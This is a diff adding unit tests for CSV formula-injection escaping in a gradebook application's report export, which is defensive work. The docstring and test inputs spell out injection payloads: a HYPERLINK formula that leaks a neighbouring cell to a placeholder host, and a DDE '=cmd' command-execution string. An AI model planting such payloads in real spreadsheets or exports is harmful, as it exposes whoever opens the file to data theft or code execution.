@@ -11,6 +11,7 @@ from notenverwaltung.gradebook import GradeBook
 from notenverwaltung.grading_scale import GradeBand, GradingScale
 from notenverwaltung.models import Course
 from notenverwaltung.reports import CsvReportGenerator, ReportBuilder
+from notenverwaltung.reports.csv_report import escape_formula
 from notenverwaltung.storage import GradeStore
 
 
@@ -181,3 +182,45 @@ class TestGradePointAverage:
         names = [c.course_name for c in builder.student_report("S001").courses]
 
         assert names == sorted(names)
+
+
+class TestFormulaEscaping:
+    """A downloaded report opens in Excel, and several columns are free text.
+
+    A teacher writes `grades.title` and `notes`; any signed-in user writes their
+    own `full_name` through their profile. A cell beginning `=` is a formula, and
+    `=HYPERLINK("http://…"&A2,"Results")` exfiltrates the row beside it the moment
+    an administrator opens the file.
+    """
+
+    def test_a_formula_is_neutralised(self) -> None:
+        """The conventional apostrophe: the cell stays readable, stops executing."""
+        assert escape_formula('=HYPERLINK("http://x/?d="&A2,"Click")').startswith("'=")
+        assert escape_formula("+1+1") == "'+1+1"
+        assert escape_formula("@SUM(A1)") == "'@SUM(A1)"
+        assert escape_formula("\tcmd") == "'\tcmd"
+
+    def test_numbers_are_left_alone(self) -> None:
+        """The counterweight. Quoting every leading minus would break real figures."""
+        assert escape_formula("-1.00") == "-1.00"
+        assert escape_formula("-0.5") == "-0.5"
+        assert escape_formula(42) == 42
+        assert escape_formula(3.5) == 3.5
+        assert escape_formula(None) is None
+
+    def test_ordinary_text_is_untouched(self) -> None:
+        """Most cells are names and ids and must survive unchanged."""
+        assert escape_formula("Anna Schmidt") == "Anna Schmidt"
+        assert escape_formula("CS101") == "CS101"
+        assert escape_formula("") == ""
+
+    def test_a_rendered_report_carries_the_escape(self, gradebook: GradeBook) -> None:
+        """End to end: the wrap is on the writer, so no row can forget it."""
+        gradebook.record_grade("S001", "CS101", 70, "2026-03-01", title="=cmd|'/c calc'!A1")
+
+        output = CsvReportGenerator().render_student(
+            ReportBuilder(gradebook).student_report("S001")
+        )
+
+        assert "'=cmd" in output
+        assert "\n=cmd" not in output
